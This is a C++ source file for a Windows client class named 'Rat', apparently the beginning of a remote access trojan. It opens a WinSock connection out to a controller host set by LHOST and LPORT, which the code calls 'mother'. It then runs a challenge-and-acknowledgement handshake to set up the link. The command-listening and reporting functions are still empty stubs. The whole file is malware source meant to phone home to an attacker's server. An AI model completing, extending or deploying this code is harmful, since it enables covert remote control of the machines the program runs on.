#include <rat.hpp>

// defines behaviour for the socket to use (flags)
// 0 -> default behaviour
const int behaviour = 0;

Rat::Rat(): lhost(LHOST), lport(LPORT) {
    // Before using WinSock you must initialize the API
    // before using any socket related functonality
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return;
    }

    mother = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (mother == INVALID_SOCKET) {
        std::cerr << "Socket creation failed.\n";
        WSACleanup(); // cleans up the API
        return;
    }

    sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(lport);
    inet_pton(AF_INET, lhost.c_str(), &serv_addr.sin_addr);

    std::cout << "[*] Attempting to Connect to | " << lhost << ":" << lport << std::endl;

    if (connect(mother, (sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed.\n";
        closesocket(mother);
        WSACleanup();
        return;
    }

    bool estab = Initiate();
    
    if (estab) {
        std::cout << "[+] Established with MOTHER!" << std::endl;
        // listen for mother
    } else {
        std::cerr << "[-] Cannot Establish Properly. . ." << std::endl;
    }

    closesocket(mother);
    WSACleanup();
}

// send an initialize packet to inform we are active
bool Rat::Initiate() {
    std::cout << "[*] Sending Initializing Frame. . ." << std::endl;
    RatPacket initPacket("imgettingratty", MsgType::INIT);
    send(mother, initPacket.Frame().c_str(), initPacket.SizeOf(), behaviour);

    char buffer[1024] = {0};
    int bytesReceived = recv(mother, buffer, sizeof(buffer), behaviour);
    if (bytesReceived > 0) {
        std::cout << "[*] Recv Challenge. . ." << std::endl;

        // recv challenge
        RatPacket challPacket(std::string(buffer, bytesReceived).c_str());
        std::string code = challPacket.GetPacketMessage();

        std::cout << "[*] Replying to Challenge. . ." << std::endl;
        // reply to it
        RatPacket initPacket(code, MsgType::INIT);
        send(mother, initPacket.Frame().c_str(), initPacket.SizeOf(), behaviour);

        // final ack of before possible estab
        bytesReceived = recv(mother, buffer, sizeof(buffer), behaviour);
        if (bytesReceived > 0) {
            std::cout << "[*] Recv Estab Ack. . ." << std::endl;
            RatPacket ackPacket(std::string(buffer, bytesReceived).c_str());
            return ackPacket.GetPacketMessage() == "ratty";
        }
        return false;
    } else {
        std::cerr << "[-] Initiation Failed!" << std::endl;
        return false;
    }
}
// send non-init packets back to mother
void Rat::TellMother() {

}